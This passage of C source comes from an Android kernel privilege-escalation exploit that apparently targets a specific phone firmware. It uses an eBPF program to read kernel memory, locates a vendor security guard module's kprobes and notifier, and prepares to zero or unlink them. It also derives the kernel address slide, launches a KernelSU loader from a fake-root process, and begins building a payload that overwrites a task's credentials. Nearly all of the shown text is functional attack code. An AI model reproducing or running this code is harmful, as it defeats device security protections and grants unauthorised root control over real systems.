             log + (strlen(log) > 512 ? strlen(log) - 512 : 0));
        close(mfd);
        return -1;
    }
    logf("[+] hkd: bpf prog loaded (lookup 0xb3 + read 0x71)\n");
    return (mfd << 16) | pfd;
}

/* One BPF_PROG_RUN.  name != NULL performs a kallsyms lookup (rc: 0 ok,
 * -1 EPERM masked, -2 ENOENT); mode 1 reads 8 bytes at raw; mode 2 reads
 * 8 bytes at (resolved + delta).  Returns 0 on transport success. */
static int hkd_bpf_run(int fds, const char *name, int mode,
                       unsigned long long raw, unsigned long long delta,
                       unsigned long long *res_addr,
                       unsigned long long *res_read,
                       int *read_rc)
{
    union bpf_attr_k a;
    unsigned char v[HKD_VALUE_SIZE];
    uint32_t key = 0;
    size_t n;
    int mfd = fds >> 16, pfd = fds & 0xffff;
    int64_t lrc = -9, rrc = -9;
    uint64_t ra = 0, rr = 0;

    memset(v, 0, sizeof(v));
    n = 0;
    if (name)
    {
        n = strlen(name) + 1;
        if (n > 24)
            return -3;
        memcpy(v, name, n);
        *(uint32_t *)(v + 24) = (uint32_t)n;
    }
    *(uint32_t *)(v + 28) = (uint32_t)mode;
    *(uint64_t *)(v + HKD_RAW_ADDR) = raw;
    *(uint64_t *)(v + HKD_DELTA) = delta;

    memset(&a, 0, sizeof(a));
    a.elem.map_fd = mfd;
    a.elem.key = (uint64_t)(uintptr_t)&key;
    a.elem.value_or_next_key = (uint64_t)(uintptr_t)v;
    if (bpf_syscall_k(2 /* MAP_UPDATE_ELEM */, &a, sizeof(a.elem)) < 0)
        return -3;

    memset(&a, 0, sizeof(a));
    memcpy(a.raw, &pfd, sizeof(pfd)); /* attr+0: prog_fd */
    if (bpf_syscall_k(10 /* PROG_RUN */, &a, 0x50) < 0)
        return -3;

    memset(&a, 0, sizeof(a));
    a.elem.map_fd = mfd;
    a.elem.key = (uint64_t)(uintptr_t)&key;
    a.elem.value_or_next_key = (uint64_t)(uintptr_t)v;
    if (bpf_syscall_k(1 /* MAP_LOOKUP_ELEM */, &a, sizeof(a.elem)) < 0)
        return -3;

    memcpy(&lrc, v + HKD_LOOKUP_RC, 8);
    memcpy(&rrc, v + HKD_READ_RC, 8);
    memcpy(&ra, v + HKD_RES_ADDR, 8);
    memcpy(&rr, v + HKD_RES_READ, 8);
    if (res_addr)
        *res_addr = ra;
    if (res_read)
        *res_read = rr;
    if (read_rc)
        *read_rc = (int)rrc;
    /* The lookup rc is only meaningful when a name was requested; the
     * program stores -1 as the "lookup skipped" marker for raw reads,
     * which must NOT be treated as a transport failure (kwalk's rd64
     * got this right; the first walk attempt returned -3 for every
     * bucket read and silently matched nothing). */
    return name ? (int)lrc : 0;
}

/* raw 8-byte kernel read (mode 1); rc 0 = ok */
static int hkd_read64(int fds, unsigned long long addr,
                      unsigned long long *out)
{
    unsigned long long v = 0;
    int rc = -9;

    if (hkd_bpf_run(fds, NULL, 1, addr, 0, NULL, &v, &rc) != 0)
        return -3;
    if (rc != 0)
        return -1;
    *out = v;
    return 0;
}

/* OOS7 diagnostics: as the first privileged action, snapshot the previous
 * boot's panic record (ramoops pstore survives exactly one reboot, and the
 * retry convention's reboot would destroy it) plus this boot's kernel log,
 * so a later crash never loses the evidence. */
static void hkd_capture_diag(void)
{
    if (!g_debug_logging)
        return;
    static const char *ps[] = {
        "/sys/fs/pstore/console-ramoops-0",
        "/sys/fs/pstore/console-ramoops-1",
        "/sys/fs/pstore/dmesg-ramoops-0",
        "/sys/fs/pstore/dmesg-ramoops-1",
        NULL,
    };
    char b[65536];

    {
        int v = open("/proc/sys/kernel/kptr_restrict", O_RDONLY | O_CLOEXEC);

        if (v >= 0)
        {
            ssize_t r = read(v, b, sizeof(b) - 1);

            close(v);
            if (r > 0)
            {
                b[r] = 0;
                logf("[hkd] kptr_restrict before fd-hold=%s", b);
            }
        }
    }
    for (int i = 0; ps[i]; i++)
    {
        char dst[64];
        int in = open(ps[i], O_RDONLY | O_CLOEXEC);
        int out;
        size_t tot = 0;

        if (in < 0)
            continue;
        snprintf(dst, sizeof(dst), "/data/local/tmp/pstore%d.bin", i);
        out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
        if (out < 0)
        {
            close(in);
            continue;
        }
        for (;;)
        {
            ssize_t r = read(in, b, sizeof(b));

            if (r <= 0 || tot > (4u << 20))
                break;
            if (write(out, b, (size_t)r) < 0)
                break;
            tot += (size_t)r;
        }
        close(out);
        close(in);
        logf("[hkd] saved %s (%zu bytes)\n", ps[i], tot);
    }
    {
        /* this boot's kernel log (hks-dfd traces etc.) */
        int in = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        int out;
        size_t tot = 0;

        if (in >= 0)
        {
            out = open("/data/local/tmp/kmsg-this-boot.txt",
                       O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (out >= 0)
            {
                for (;;)
                {
                    ssize_t r = read(in, b, sizeof(b));

                    if (r <= 0 || tot > (4u << 20))
                        break;
                    if (write(out, b, (size_t)r) < 0)
                        break;
                    tot += (size_t)r;
                }
                close(out);
                logf("[hkd] saved /dev/kmsg (%zu bytes)\n", tot);
            }
            close(in);
        }
    }
}

/* Child side: arm the BPF program, signal the parent, poll until the
 * kptr window opens (parent's kptr_zero plant), then resolve the guard's
 * module .bss base WITHOUT any $d name anchors (they collide across
 * modules -- module_kallsyms_lookup_name returns the first module in
 * load order that defines the name):
 *
 *   1. resolve kprobe_table + three known-registered probe targets by
 *      name (write_enabled_file_bool, kprobe_seq_start, kallsyms_open --
 *      all static kernel symbols, immune to the collision);
 *   2. walk the 64 hash buckets reading each kprobe's addr (+0x28) via
 *      bpf_probe_read_kernel; the three guard structs sit at
 *      .bss+0x410/0x490/0x690 (verified: they are registered directly,
 *      while the load_module kprobe+kretprobe are chained under an
 *      aggr_pre_handler aggregator, whose list pointers land at
 *      .bss+0xd8/+0x158 -- zeroing their pre_handlers still works
 *      because aggr_pre_handler and kprobe_handler both skip NULL);
 *   3. all three node addresses must agree on one base, then the .data
 *      base (.bss+0x710) must read 0xdeadbeef (init signature);
 *   4. post the bases; after the parent's writes, re-read every cleared
 *      slot to verify the zeros landed. */
/* 1 only after KernelSU reaches the module loader's Live state. */
static int module_listed(void)
{
    int mods = open("/proc/modules", O_RDONLY | O_CLOEXEC);
    char mbuf[8192];
    ssize_t mn;
    int listed = 0;

    if (mods >= 0)
    {
        mn = read(mods, mbuf, sizeof(mbuf) - 1);
        close(mods);
        if (mn > 0)
        {
            mbuf[mn] = 0;
            listed = ksu_module_buffer_live(mbuf);
        }
    }
    return listed;
}

/*
 * Run the ksu stage script from this (fake-root) context and report
 * whether the module came up.  Used twice: once mid-handshake when the
 * parent posts "K" after the minimal load-gate slots, and once in the
 * normal endgame.  The script is idempotent (it re-guards on an already
 * listed module), and its stdout lands in iq.log, so a successful early
 * attempt also emits the KSU_LOADED marker the runner classifies on.
 */
static int run_ksu_stage_worker(const char *tag)
{
    pid_t fw;
    int fst = 0;

    write_ksu_script();
    /* Reset-surviving bracket around the fork/exec: append + fsync
     * (page-cache-only logs die on panic and pstore is dead here). */
    if (g_debug_logging) {
        int kf = open("/data/local/tmp/ksu-trace.log",
                      O_WRONLY | O_CREAT | O_APPEND, 0666);

        if (kf >= 0)
        {
            dprintf(kf, "[%s] %s worker forking (pid=%d)\r\n",
                    /* rough timestamp: seconds since boot marker is
                     * enough to order events */
                    "C", tag, (int)getpid());
            fsync(kf);
            close(kf);
        }
        kf = open("/dev/kmsg", O_WRONLY | O_CLOEXEC);
        if (kf >= 0)
        {
            dprintf(kf, "ksu-stage: %s worker forking\r\n", tag);
            close(kf);
        }
    }
    fw = fork();
    if (fw == 0)
    {
        char *const av[] = {(char *)"sh",
                            (char *)"/data/local/tmp/ksu_stage.sh", NULL};

        setsid();
        execve("/system/bin/sh", av, environ);
        _exit(127);
    }
    if (fw > 0)
        waitpid(fw, &fst, 0);
    if (g_debug_logging) {
        int kf = open("/data/local/tmp/ksu-trace.log",
                      O_WRONLY | O_CREAT | O_APPEND, 0666);

        if (kf >= 0)
        {
            dprintf(kf, "[C] %s worker returned exit=%#x\r\n", tag, fst);
            fsync(kf);
            close(kf);
        }
    }
    logf("[fake] ksu stage (%s) worker exit=%#x\n", tag, fst);
    return module_listed();
}

/*
 * Kernel statics for slide-derived probe targets (vmlinux-oos7 nm):
 * name lookup is NOT usable for __arm64_sys_finit_module (25 bytes >
 * the 24-byte BPF name buffer) -- but once module_notify_list resolves
 * live, every module-path target is just static+slide.  MNC_STATIC is
 * the guard module's mnc notifier_call fn VA (file .text).
 */
#define HKD_MNL_STATIC 0xffffffc0821ec4a8ULL
#define HKD_FINIT_STATIC 0xffffffc08017c254ULL
#define HKD_INITMOD_STATIC 0xffffffc08017bfc8ULL
#define HKD_LOADMOD_STATIC 0xffffffc08017d51cULL
#define HKD_MNC_STATIC 0x102548ULL
#define HKD_EXTRAS_PATH "/data/local/tmp/hkd_extras"
#define HKD_SLIDE_PATH "/data/local/tmp/ksu_slide"

/*
 * Sweep the live kprobe_table for EVERY guard-owned probe -- both the
 * .bss structs and the heap kzalloc'd ones (proven live: a heap kprobe
 * on load_module dispatched the mnc_nb deny; the __arm64_sys_finit_
 * module one silently regs-pokes -EPERM).  A node is guard-owned iff
 * its hooked addr (+0x28) is one of the module-path functions, or its
 * pre_handler (+0x40) points into the guard module's .text window.
 * Matching nodes are written to /data/local/tmp/hkd_extras (one hex
 * address per line) for the parent to zero at node+0x40.
 */
static int hkd_sweep_guard_probes(int fds, unsigned long long kt,
                                  unsigned long long kslide,
                                  unsigned long long win_lo,
                                  unsigned long long win_hi,
                                  unsigned long long bss,
                                  unsigned long long data,
                                  const char *tag)
{
    unsigned long long targets[5];
    int found = 0;
    int ef;

    targets[0] = HKD_FINIT_STATIC + kslide;
    targets[1] = HKD_INITMOD_STATIC + kslide;
    targets[2] = HKD_LOADMOD_STATIC + kslide;
    targets[3] = 0xffffffc08017fc4cULL + kslide; /* complete_formation */
    targets[4] = 0xffffffc080180020ULL + kslide; /* do_init_module */
    ef = open(HKD_EXTRAS_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
              0666);
    for (unsigned b = 0; b < 64; b++)
    {
        unsigned long long n = 0;

        if (hkd_read64(fds, kt + (unsigned long long)b * 8, &n) != 0 || !n)
            continue;
        while (n && found < 16)
        {
            unsigned long long addr = 0, pre = 0;
            int hit = 0;
            const char *why = "";

            /* skip the module .bss structs: the parent's slot table
             * already covers those (avoids double-planting) */
            if (bss && n >= bss && n < data + 0x6e8ULL)
            {
                if (hkd_read64(fds, n, &n) != 0)
                    break;
                continue;
            }
            (void)hkd_read64(fds, n + 0x28, &addr);
            (void)hkd_read64(fds, n + 0x40, &pre);
            /* survivor semantics: a node whose pre_handler is already
             * 0 is dead (cleared, or aggregated under a carrier probe
             * whose pre_handler we zeroed -- observed live: the heap
             * load_module probe read pre=0 after the .bss slot-0
             * zero) -- never match it, or the recheck loop never
             * converges. */
            if (pre)
            {
                for (int p = 0; p < 5; p++)
                    if (addr == targets[p])
                    {
                        hit = 1;
                        why = p == 0   ? "finit_module"
                              : p == 1 ? "init_module"
                              : p == 2 ? "load_module"
                              : p == 3 ? "complete_formation"
                                       : "do_init_module";
                    }
                if (!hit && win_lo && pre >= win_lo && pre < win_hi)
                {
                    hit = 1;
                    why = "guard-text pre_handler";
                }
            }
            if (hit)
            {
                char line[32];

                logf("[+] hkd: (%s) guard probe node=%#llx addr=%#llx "
                     "pre=%#llx (%s)\n",
                     tag, n, addr, pre, why);
                if (ef >= 0)
                {
                    snprintf(line, sizeof(line), "%llx\n", n);
                    (void)!write(ef, line, strlen(line));
                }
                found++;
            }
            if (hkd_read64(fds, n, &n) != 0)
                break;
        }
    }
    if (ef >= 0)
        close(ef);
    (void)chmod(HKD_EXTRAS_PATH, 0666);
    logf("[+] hkd: (%s) sweep found %d live guard probe(s)\n", tag, found);
    return found;
}

static void hkd_child_stage(void)
{
    static const struct { const char *nm; unsigned long long off; } probes[] = {
        {"write_enabled_file_bool", 0x410ULL},
        {"kprobe_seq_start", 0x490ULL},
        {"kallsyms_open", 0x690ULL},
    };
    static const unsigned long long verify_offs[13] = {
        0x108ULL, 0x188ULL, 0x450ULL, 0x4d0ULL, 0x550ULL,
        0x5d0ULL, 0x650ULL, 0x6d0ULL, 0x850ULL, 0x858ULL
    };
    unsigned long long bss = 0, data = 0, a, kt = 0;
    unsigned long long tgt[3] = {0, 0, 0};
    unsigned long long nodes[3] = {0, 0, 0};
    unsigned long long nfix[2] = {0, 0}; /* module_notify_list unlink
                                          * targets (kernel addresses
                                          * whose zeroing detaches the
                                          * guard's notifier) */
    unsigned long long g_kslide = 0, g_win_lo = 0, g_win_hi = 0; /* kernel
                                                    * slide + guard text
                                                    * window for the
                                                    * guard-probe sweep */
    int fds, fd, r;

    fds = hkd_bpf_setup();
    if (fds < 0)
        return;
    fd = open(HKD_OPEN_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (fd >= 0)
    {
        (void)write(fd, "1", 1);
        close(fd);
        (void)chmod(HKD_OPEN_PATH, 0666);
    }
    logf("[+] hkd: armed; polling for kptr window\n");
    for (int i = 0; i < 120000; i++) /* ~120s at ~1ms per poll */
    {
        r = hkd_bpf_run(fds, "kprobe_table", 0, 0, 0, &kt, NULL, NULL);
        if (r == 0)
            break;
        if (r == -2)
        {
            logf("[!] hkd: kprobe_table not in kallsyms??\n");
            return;
        }
        if (r == -3)
        {
            logf("[!] hkd: bpf transport error\n");
            return;
        }
        usleep(1000);
    }
    if (r != 0 || !kt)
    {
        logf("[!] hkd: kptr window never opened (120s)\n");
        return;
    }
    logf("[+] hkd: window open; kprobe_table=%#llx\n", kt);
    for (int p = 0; p < 3; p++)
    {
        r = hkd_bpf_run(fds, probes[p].nm, 0, 0, 0, &tgt[p], NULL, NULL);
        if (r != 0 || !tgt[p])
        {
            logf("[!] hkd: cannot resolve %s (rc=%d)\n", probes[p].nm, r);
            return;
        }
    }
    /* walk all 64 buckets; match addr (+0x28) against the targets */
    for (unsigned b = 0; b < 64; b++)
    {
        unsigned long long n = 0;
        int guard = 0;

        if (hkd_read64(fds, kt + (unsigned long long)b * 8, &n) != 0 || !n)
            continue;
        while (n && !guard)
        {
            if (hkd_read64(fds, n + 0x28, &a) == 0)
            {
                for (int p = 0; p < 3; p++)
                {
                    if (a == tgt[p])
                    {
                        unsigned long long cand = n - probes[p].off;

                        if (nodes[p])
                        {
                            if (nodes[p] != n)
                                logf("[!] hkd: dup probe match %d: %#llx\n",
                                     p, n);
                            guard = 1;
                        }
                        else
                        {
                            nodes[p] = n;
                            logf("[+] hkd: probe %d node=%#llx -> bss=%#llx\n",
                                 p, n, cand);
                        }
                    }
                }
            }
            if (hkd_read64(fds, n, &n) != 0)
                break;
        }
    }
    for (int p = 0; p < 3; p++)
    {
        if (!nodes[p])
        {
            logf("[!] hkd: probe %d (%s) not found in kprobe_table\n",
                 p, probes[p].nm);
            return;
        }
        if (bss == 0)
            bss = nodes[p] - probes[p].off;
        else if (bss != nodes[p] - probes[p].off)
        {
            logf("[!] hkd: base mismatch: %#llx vs %#llx\n",
                 bss, nodes[p] - probes[p].off);
            return;
        }
    }
    if (bss < 0xffffff0000000000ULL)
    {
        logf("[!] hkd: implausible bss base %#llx\n", bss);
        return;
    }
    /* .data signature: init writes 0xdeadbeef at .data+0 (bss+0x710)
     * and .data+0x16c (bss+0x87c) */
    if (hkd_read64(fds, bss + 0x710ULL, &a) != 0 || a != 0xdeadbeefULL ||
        hkd_read64(fds, bss + 0x87cULL, &a) != 0 ||
        (a & 0xffffffffULL) != 0xdeadbeefULL)
    {
        logf("[!] hkd: .data signature mismatch (got %#llx)\n", a);
        return;
    }
    data = bss + 0x710ULL;
    logf("[+] hkd: bss=%#llx data=%#llx (deadbeef ok)\n", bss, data);
    /*
     * module_notify_list UNLINK targets (replaces the old, fatal
     * zeroing of .data+0x5f8/0x600/0x608).
     *
     * The guard registers mnc_nb -- whose notifier_call is
     * FUN_00102548 (the proven MODULE_STATE_COMING deny, file image at
     * .data+0x608 in MAINLINE layout {notifier_call, next, priority})
     * -- into the kernel's module_notify_list (head field at +0x40 on
     * this build: blocking_notifier_call_chain does `ldr x8,[x0,#0x40]!`).
     * Zeroing notifier_call is NOT an option: notifier_call_chain()
     * invokes nb->notifier_call() unconditionally, so a NULL call
     * panicked the kernel at the first finit_module (deterministic,
     * observed in 5+ campaign attempts: crash exactly inside insmodf).
     * Instead we UNLINK: zero the ->next field of the chain member
     * BEFORE the guard's nb (or the list head's first-pointer).
     *
     * Identification is by notifier_call VALUE, not by node location:
     * the registered nb may be heap-allocated (the .data struct may be
     * just a template), so compare each node's call against the LIVE
     * addresses of the three known guard functions read from .data
     * (+0x608 mnc, +0x5f8, +0x600).  The whole chain is logged for
     * evidence either way.
     */
    {
        unsigned long long mnl = 0;
        unsigned long long gcalls[3] = {0, 0, 0};
        unsigned long long gfn;

        r = hkd_bpf_run(fds, "module_notify_list", 0, 0, 0, &mnl,
                        NULL, NULL);
        if (r != 0 || !mnl)
            logf("[!] hkd: module_notify_list not resolvable (rc=%d); "
                 "load will hit the mnc_nb deny\n", r);
        else
        {
            /* live module-text addresses of the three guard fns */
            if (hkd_read64(fds, data + 0x608ULL, &gfn) == 0 && gfn)
                gcalls[0] = gfn;
            if (hkd_read64(fds, data + 0x5f8ULL, &gfn) == 0 && gfn)
                gcalls[1] = gfn;
            if (hkd_read64(fds, data + 0x600ULL, &gfn) == 0 && gfn)
                gcalls[2] = gfn;
            logf("[+] hkd: guard fn live addrs: mnc=%#llx b=%#llx "
                 "c=%#llx (mnl=%#llx)\n",
                 gcalls[0], gcalls[1], gcalls[2], mnl);
            /* head field at +0x40 (verified from this build's
             * blocking_notifier_call_chain disasm); walk and log the
             * whole chain, marking guard nodes.  VALIDATED: the chain
             * holds 10 kernel notifiers (trace/kprobe/jump_label/
             * ddebug/bpf/btf/tracepoint module callbacks) with the
             * guard's nb appended at the TAIL (register_module_notifier
             * resolved at runtime from the decrypted name table --
             * that is why it never appeared in the import list), so
             * the walk must run well past 10 steps (an earlier cap of
             * 10 stopped right before the guard and misread the chain
             * as guard-free). */
            {
                unsigned long long nb = 0, prev_field = 0;

                if (hkd_read64(fds, mnl + 0x40ULL, &nb) == 0 && nb &&
                    nb >= 0xffffff0000000000ULL)
                {
                    int steps = 0, guard_nbs = 0;

                    prev_field = mnl + 0x40ULL;
                    while (nb && steps++ < 32)
                    {
                        unsigned long long nxt = 0, callv = 0;
                        int is_guard = 0;

                        (void)hkd_read64(fds, nb, &callv);
                        if (callv)
                            for (int gi = 0; gi < 3; gi++)
                                if (callv == gcalls[gi])
                                    is_guard = 1;
                        /* the guard's notifier_block itself lives in
                         * our module (.data+0x608) -- an nb address in
                         * the module window is a guard node even if
                         * its call value is unexpected */
                        if (nb >= bss && nb < data + 0x6e8ULL)
                            is_guard = 1;
                        (void)hkd_read64(fds, nb + 8, &nxt);
                        logf("[*] hkd: chain[%d] nb=%#llx call=%#llx "
                             "next=%#llx%s\n",
                             steps - 1, nb, callv, nxt,
                             is_guard ? "  <== GUARD" : "");
                        if (is_guard)
                        {
                            /* the link pointing at this nb is the
                             * unlink target */
                            if (guard_nbs < 2)
                                nfix[guard_nbs] = prev_field;
                            guard_nbs++;
                        }
                        if (!nxt || nxt < 0xffffff0000000000ULL)
                            break;
                        prev_field = nb + 8;
                        nb = nxt;
                    }
                    if (guard_nbs)
                        logf("[+] hkd: %d guard nb(s) in chain; unlink "
                             "%#llx %#llx\n",
                             guard_nbs, nfix[0], nfix[1]);
                    else
                        logf("[!] hkd: chain fully walked (%d nodes), "
                             "no guard nb -- cannot unlink\n",
                             steps);
                }
                else
                    logf("[!] hkd: module_notify_list head unplausible "
                         "(%#llx)\n", nb);
            }
            if (!nfix[0])
                logf("[!] hkd: no unlink target -- mnc_nb deny may "
                     "still fire\n");
        }
        /* Phase 2 sweep: every guard-owned kprobe (heap + .bss) via
         * module-path addr match and the guard .text pre_handler
         * window.  Also export the TRUE kernel slide (BPF-derived --
         * /proc/kallsyms reads are unreliable: the phmdop re-pin had
         * left kptr_restrict=2 and ksupatch's `auto` mode computed the
         * underflow garbage 0x3f80000000 = -_text_static on EVERY run,
         * so every patched module so far would have jumped to garbage
         * at init had the load ever succeeded). */
        if (mnl && gcalls[0])
        {
            unsigned long long kslide = mnl - HKD_MNL_STATIC;
            /* guard .text window from LIVE .bss slot pre_handlers
             * (slots 2-7 are still armed here): their guard-text
             * pointers bound the module's .text mapping -- the Ghidra
             * file layout is NOT the runtime layout, so gcalls[0] -
             * static_va is meaningless. */
            static const unsigned long long slot_pre_offs[6] = {
                0x450ULL, 0x4d0ULL, 0x550ULL, 0x5d0ULL, 0x650ULL, 0x6d0ULL
            };
            int sf = open(HKD_SLIDE_PATH,
                          O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);

            g_kslide = kslide;
            for (int i = 0; i < 6; i++)
            {
                unsigned long long pv = 0;

                if (hkd_read64(fds, bss + slot_pre_offs[i], &pv) == 0 &&
                    pv > 0xffffff0000000000ULL)
                {
                    if (!g_win_lo || pv < g_win_lo)
                        g_win_lo = pv;
                    if (pv > g_win_hi)
                        g_win_hi = pv;
                }
            }
            if (g_win_lo)
            {
                unsigned long long lo = g_win_lo & ~0xfffULL;
                unsigned long long hi = (g_win_hi + 0xfffULL) & ~0xfffULL;

                g_win_lo = lo - 0x2000ULL;
                g_win_hi = hi + 0x3000ULL;
            }
            if (sf >= 0)
            {
                char sb[32];

                snprintf(sb, sizeof(sb), "%llx\n", kslide);
                (void)!write(sf, sb, strlen(sb));
                close(sf);
                (void)chmod(HKD_SLIDE_PATH, 0666);
            }
            logf("[+] hkd: kernel slide=%#llx; guard text window "
                 "[%#llx,%#llx); exported %s\n",
                 kslide, g_win_lo, g_win_hi, HKD_SLIDE_PATH);
            (void)hkd_sweep_guard_probes(fds, kt, kslide, g_win_lo,
                                         g_win_hi, bss, data, "init");
        }
        else
            logf("[!] hkd: no mnl/mnc -- slide + sweep skipped\n");
    }
    /* pre-write verification: the 8 pre_handler slots must be nonzero.
     * Seven are module-text handlers, but .bss+0x188 (the load_module
     * KRETPROBE's entry handler) legitimately holds the kernel's own
     * pre_handler_kretprobe -- a kernel-image address that may sit in a
     * different 4GB-aligned window than the module (observed live:
     * 0xffffffe0033da788 vs module bss 0xffffffdf...).  A kernel-text
     * address (top bits 0xffffffXX, not vmalloc 0xffffff8x) is valid. */
    for (int i = 0; i < 8; i++)
    {
        if (hkd_read64(fds, bss + verify_offs[i], &a) != 0 || !a)
        {
            logf("[!] hkd: pre_handler +%#llx empty (%#llx)\n",
                 verify_offs[i], a);
            return;
        }
        if ((a >> 32) != (bss >> 32) &&
            !((a >> 40) == 0xffffffe0ULL || (a >> 40) == 0xffffffe1ULL ||
              (a >> 40) == 0xffffffe2ULL || (a >> 40) == 0xffffffe3ULL))
        {
            logf("[!] hkd: pre_handler +%#llx implausible (%#llx)\n",
                 verify_offs[i], a);
            return;
        }
    }
    logf("[+] hkd: 8 pre_handlers live; posting bases\n");
    {
        char hb[192];

        snprintf(hb, sizeof(hb), "%llx %llx %llx %llx %llx %llx %llx\n",
                 bss, data, 0ULL, 0ULL, 0ULL, nfix[0], nfix[1]);
        fd = open(HKD_BASE_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                  0666);
        if (fd < 0)
        {
            logf("[!] hkd: cannot post bases (errno=%d)\n", errno);
            return;
        }
        (void)write(fd, hb, strlen(hb));
        close(fd);
        (void)chmod(HKD_BASE_PATH, 0666);
    }
    logf("[+] hkd: bases posted; per-slot handshake with parent\n");
    /* Per-slot handshake: the parent writes slot N then posts "N" to
     * hkd_go; we verify the slot reads 0 and reply "ok N"/"fail N" in
     * hkd_base (reused as the reply channel).  This catches the
     * false-positive-burst failure mode where a plant completes but the
     * zero never lands (observed live: +0x450 read back its ORIGINAL
     * handler after a "cleared" log line; the module has no runtime
     * re-registration path, so any nonzero is a failed write).
     * ALL offsets are .bss-relative (the .data section begins at
     * .bss+0x710: flag table .data+0x140 = bss+0x850).
     * The notifier words (.data+0x5f8/0x600/0x608) are deliberately
     * ABSENT: mnc_nb at .data+0x608 is a REGISTERED notifier_block
     * whose zeroed call = NULL-call panic on the first module event;
     * it is neutralized by UNLINKING it (nfix targets above). */
    {
        static const unsigned long long slots[10] = {
            0x108ULL, 0x188ULL, 0x450ULL, 0x4d0ULL, 0x550ULL,
            0x5d0ULL, 0x650ULL, 0x6d0ULL, 0x850ULL, 0x858ULL
        };
        int done = 0;

        for (int i = 0; i < 36000 && !done; i++) /* 3600s cap */
        {
            struct stat st;
            char buf[32] = {0};
            int gf, rn;
            int slot = -1;

            usleep(100000);
            if (stat(HKD_GO_PATH, &st) != 0)
                continue;
            gf = open(HKD_GO_PATH, O_RDONLY | O_CLOEXEC);
            if (gf < 0)
                continue;
            rn = read(gf, buf, sizeof(buf) - 1);
            close(gf);
            (void)unlink(HKD_GO_PATH);
            if (rn <= 0)
                continue;
            /* END marker: only digits are slot numbers (atoi("END")==0
             * would otherwise alias slot 0 and hang the handshake). */
            if (buf[0] == 'R' && buf[1] <= ' ')
            {
                /* Post-sweep recheck: the parent cleared the extra
                 * probes from hkd_extras; re-walk the table and report
                 * whether any guard probe remains (the file is
                 * rewritten with the survivors for a retry round). */
                int left;

                if (g_kslide)
                    left = hkd_sweep_guard_probes(fds, kt, g_kslide,
                                                  g_win_lo, g_win_hi, bss,
                                                  data, "recheck");
                else
                    left = -1;
                snprintf(buf, sizeof(buf), "%s R\n", left == 0 ? "ok" : "fail");
                logf(left == 0 ? "[+] hkd: recheck clean (no guard probes)\n"
                               : "[!] hkd: recheck: %d guard probe(s) remain\n",
                     left);
                {
                    int rf = open(HKD_BASE_PATH,
                                  O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                                  0666);

                    if (rf >= 0)
                    {
                        (void)write(rf, buf, strlen(buf));
                        close(rf);
                    }
                }
                continue;
            }
            if (buf[0] == 'N' && (buf[1] == '1' || buf[1] == '2'))
            {
                /* unlink-slot verify: the parent zero-planted one of
                 * the module_notify_list unlink targets; check it. */
                int idx = buf[1] - '1';

                if (nfix[idx] &&
                    hkd_read64(fds, nfix[idx], &a) == 0 && a == 0)
                {
                    snprintf(buf, sizeof(buf), "ok N%d\n", idx + 1);
                    logf("[+] hkd: unlink target %d (%#llx) verified "
                         "zero\n", idx + 1, nfix[idx]);
                }
                else
                {
                    snprintf(buf, sizeof(buf), "fail N%d\n", idx + 1);
                    logf("[!] hkd: unlink target %d (%#llx) NOT zero "
                         "(%#llx)\n", idx + 1, nfix[idx], a);
                }
                {
                    int rf = open(HKD_BASE_PATH,
                                  O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                                  0666);

                    if (rf >= 0)
                    {
                        (void)write(rf, buf, strlen(buf));
                        close(rf);
                    }
                }
                continue;
            }
            if (buf[0] == 'K' && buf[1] <= ' ')
            {
                /* Mid-handshake module-load attempt: the parent has
                 * cleared the minimal load-gate slots and wants to try
                 * loading BEFORE running the remaining plant gauntlet
                 * (each plant risks the burst-race panic; the goal is
                 * the module, not a perfectly dead guard).  We are the
                 * fake-root process, so the stage script runs with full
                 * caps here.  Reply "ksu K" on success so the parent
                 * stops planting entirely. */
                int listed;

                {
                    unsigned long long flags = 0;
                    if (!g_kslide || hkd_read64(fds,
                            KPROBES_DISARM_STATIC + g_kslide, &flags) != 0 ||
                        (flags & 0xffULL) != 0 || ((flags >> 32) & 0xffULL) != 1)
                        park_forever("probe-fallback: global probe state invalid");
                    logf("[+] KPROBE_STATE_OK all_disarmed=0 initialized=1 (untouched)\n");
                }
                logf("[+] hkd: K received; running early ksu stage\n");
                listed = run_ksu_stage_worker("early-K");
                snprintf(buf, sizeof(buf), "%s K\n", listed ? "ksu" : "no");
                logf(listed
                         ? "[+] hkd: EARLY MODULE LOAD SUCCEEDED\n"
                         : "[*] hkd: early load did not list; continuing "
                           "handshake\n");
                {
                    int rf = open(HKD_BASE_PATH,
                                  O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                                  0666);

                    if (rf >= 0)
                    {
                        (void)write(rf, buf, strlen(buf));
                        close(rf);
                    }
                }
                continue;
            }
            if (buf[0] < '0' || buf[0] > '9')
            {
                logf("[+] hkd: parent handshake complete (%s)\n", buf);
                done = 1;
                continue;
            }
            slot = atoi(buf);
            if (slot < 0 || slot >= 10)
                continue;
            if (hkd_read64(fds, bss + slots[slot], &a) == 0 && a == 0)
            {
                snprintf(buf, sizeof(buf), "ok %d\n", slot);
                logf("[+] hkd: slot %d (+%#llx) verified zero\n",
                     slot, slots[slot]);
            }
            else
            {
                snprintf(buf, sizeof(buf), "fail %d\n", slot);
                logf("[!] hkd: slot %d (+%#llx) NOT zero (%#llx)\n",
                     slot, slots[slot], a);
            }
            {
                int rf = open(HKD_BASE_PATH,
                              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);

                if (rf >= 0)
                {
                    (void)write(rf, buf, strlen(buf));
                    close(rf);
                }
            }
        }
        (void)unlink(HKD_BASE_PATH);
        (void)unlink(HKD_OPEN_PATH);
        logf(done ? "[+] hkd: handshake finished\n"
                  : "[!] hkd: handshake timeout\n");
    }
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
